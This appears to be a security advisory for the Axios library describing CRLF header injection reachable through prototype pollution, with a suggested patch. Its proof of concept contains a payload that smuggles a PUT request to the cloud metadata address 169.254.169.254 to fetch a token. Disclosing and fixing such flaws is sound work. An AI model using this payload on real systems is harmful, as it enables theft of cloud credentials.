summary: "Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n# Vulnerability\
  \ Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\n\
  The Axios library is vulnerable to a specific gadget-style attack chain in which **prototype\
  \ pollution** in a third-party dependency may be leveraged to inject unsanitized header values\
  \ into outbound requests.\n\nAxios can be used as a gadget after pollution occurs elsewhere\
  \ because header values merged from attacker-controlled prototype properties are not sanitized\
  \ for CRLF (`\\r\\n`) characters before being written to the request. In affected deployments,\
  \ this may enable limited request manipulation or metadata access as part of a higher-complexity\
  \ exploit chain.\n\n**Severity**: Moderate (CVSS 3.1 Base Score: 4.8)\n**Affected Versions**:\
  \ All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)\n\
  \n## Usage of \\\"Helper\\\" Vulnerabilities\nThis issue requires a separate **prototype pollution**\
  \ vulnerability in another library in the application stack (for example, `qs`, `minimist`,\
  \ `ini`, or `body-parser`). If an attacker can pollute `Object.prototype`, Axios may pick\
  \ up the polluted properties during config merge.\n\nBecause Axios does not sanitise these\
  \ merged header values for CRLF (`\\r\\n`) characters, the polluted property can alter the\
  \ structure of an outbound HTTP request.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated\
  \ Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The\
  \ attacker sends a payload that sets:\n```javascript\nObject.prototype['x-amz-target'] = \\\
  \"dummy\\r\\n\\r\\nPUT /latest/api/token HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds:\
  \ 21600\\r\\n\\r\\nGET /ignore\\\";\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application\
  \ makes a completely safe, hardcoded request:\n```javascript\n// This looks safe to the developer\n\
  await axios.get('https://analytics.internal/pings'); \n```\n\n### 3. The Execution\nAxios\
  \ merges the prototype property `x-amz-target` into the request headers. It then writes the\
  \ header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n\
  ```http\nGET /pings HTTP/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT /latest/api/token\
  \ HTTP/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET /ignore\
  \ HTTP/1.1\n...\n```\n\n### 4. The Impact\nIn environments where requests can reach cloud\
  \ metadata endpoints or sensitive internal services, the injected header content may help\
  \ bypass expected request constraints and expose limited credentials or modify request semantics.\
  \ This impact depends on application context and a separate prototype-pollution primitive.\n\
  \n## Impact Analysis\n-   **Confidentiality**: May expose limited sensitive information in\
  \ affected network environments.\n-   **Integrity**: May allow modification of outbound request\
  \ structure or injected headers.\n-   **Attack Complexity**: Exploitation requires a separate\
  \ prototype-pollution vulnerability and a reachable target service.\n\n## Recommended Fix\n\
  Validate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the\
  \ underlying request function.\n\n**Patch Suggestion:**\n```javascript\n// In lib/adapters/http.js\n\
  utils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (/[\\r\\n]/.test(val))\
  \ {\n    throw new Error('Security: Header value contains invalid characters');\n  }\n  //\
  \ ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\
  \nThis report was generated as part of a security audit of the Axios library."
